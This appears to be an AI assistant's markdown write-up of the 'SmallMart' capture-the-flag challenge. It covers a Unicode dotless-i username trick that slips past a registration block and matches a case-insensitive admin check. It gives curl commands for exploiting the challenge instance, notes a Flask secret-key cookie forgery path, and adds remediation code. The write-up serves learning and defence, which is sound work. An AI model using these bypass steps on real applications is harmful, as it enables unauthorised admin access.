Excellent! You got the flag: `flag{20b4ca2de1c47ba9e43f20b98979a9a4}`

Here's a complete, professional write-up in markdown format that you can save for your notes or share.

```markdown
# SmallMart CTF Challenge Write-up

## Challenge Overview

- **Challenge Name:** SmallMart
- **Platform:** HackingHub
- **Difficulty:** Advanced
- **Goal:** Identify and exploit a vulnerability in the SmallMart online store application to retrieve the flag.

## Vulnerability Summary

The application contains a **Unicode case-handling mismatch** between user registration and admin access control:

- **Registration** uses `username.lower()` – this does not convert the dotless 'ı' (U+0131) to a regular 'i'
- **Admin check** uses `re.IGNORECASE` – this treats 'ı' as equal to 'i'

This allows an attacker to register with `admın` (using U+0131 dotless i), which bypasses the registration block for "admin" but passes the admin authentication check.

## Root Cause Analysis

From the provided `app.py` source code:

```python
# Registration check (blocks exact "admin")
if username.lower() == "admin":
    return "Username not allowed", 400

# Admin access check (case-insensitive regex)
if re.match(r"^admin$", username, flags=re.IGNORECASE):
    # Grant admin privileges
```

The mismatch occurs because:
- `"admın".lower()` → `"admın"` (unchanged, dotless i remains)
- `re.match(r"^admin$", "admın", re.IGNORECASE)` → `True` (matches)

## Exploitation Steps

### Step 1: Target Identification

The challenge instance was available at:
```
https://OfwIotf8sUs1.ctfhub.io
```

> **Note:** If the instance returns 400 errors, kill and restart the server.

### Step 2: Generate Unicode Username

The key is the **dotless i** character: `ı` (U+0131)

```bash
# Using Python to generate the username
USER=$(python3 -c "print('adm\u0131n')")
echo $USER  # Outputs: admın
```

### Step 3: Register Malicious User

```bash
curl -X POST \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -d "username=admın&password=test123" \
  "https://OfwIotf8sUs1.ctfhub.io/register"
```

**Expected Response:** HTTP 302 redirect (success)

### Step 4: Login to Get Session

```bash
curl -c cookies.txt \
  -H "Content-Type: application/x-www-form-urlencoded" \
  -X POST \
  -d "username=admın&password=test123" \
  "https://OfwIotf8sUs1.ctfhub.io/login"
```

### Step 5: Access Admin Panel and Retrieve Flag

```bash
curl -b cookies.txt \
  "https://OfwIotf8sUs1.ctfhub.io/admin"
```

**Flag Retrieved:**
```
flag{20b4ca2de1c47ba9e43f20b98979a9a4}
```

## Browser-Based Exploitation (Alternative)

For those who prefer a GUI approach:

1. Navigate to the registration page: `https://[TARGET].ctfhub.io/register`
2. Register with username: `admın` (copy the dotless i from a Unicode character picker)
3. Set password: `test123`
4. Login with the same credentials
5. Visit `/admin` to view the flag

## Why This Works

| Step | Method | Input: `admın` | Result |
|------|--------|----------------|--------|
| Registration | `username.lower()` | `admın` (unchanged) | ✅ Allowed (not "admin") |
| Admin Check | `re.IGNORECASE` | Matches "admin" | ✅ Granted access |

The dotless 'ı' (U+0131) survives the `.lower()` transformation but is treated as case-insensitive equal to 'i' by the regex engine.

## Secondary Vulnerability (Not Used Here)

The source code also contained a hardcoded default secret key:

```python
app.secret_key = os.environ.get("SECRET_KEY", "fake_key_for_testing")
```

If deployed with this default, an attacker could forge admin session cookies using `flask-unsign`. This was **not** required for the live instance as the secret was properly configured.

## Remediation Recommendations

To fix this vulnerability:

```python
import unicodedata

def normalize_username(name: str) -> str:
    """Consistent username normalization."""
    return unicodedata.normalize("NFKC", name or "").casefold().strip()

# Apply to both registration and admin checks
normalized = normalize_username(username)
if normalized == "admin":
    # Handle admin access or block registration
```

Additionally:
- Remove hardcoded secret key fallback
- Enforce `SECRET_KEY` environment variable
- Use consistent string comparison methods throughout the application

## Flag

```
flag{20b4ca2de1c47ba9e43f20b98979a9a4}
```

## References

- [Unicode Security Considerations (UTS #39)](https://unicode.org/reports/tr39/)
- [Python casefold() documentation](https://docs.python.org/3/library/stdtypes.html#str.casefold)
- [Flask Session Security](https://flask.palletsprojects.com/en/stable/security/#sessions)

## Tools Used

- `curl` - HTTP request handling
- `python3` - Unicode character generation
- Browser Developer Tools - Alternative exploitation method

---
*Write-up completed: May 2026*
*Challenge by: RezyDev*
```

You can save this as `smallmart_writeup.md` and use it for your documentation or share it with others. Congratulations on solving the challenge!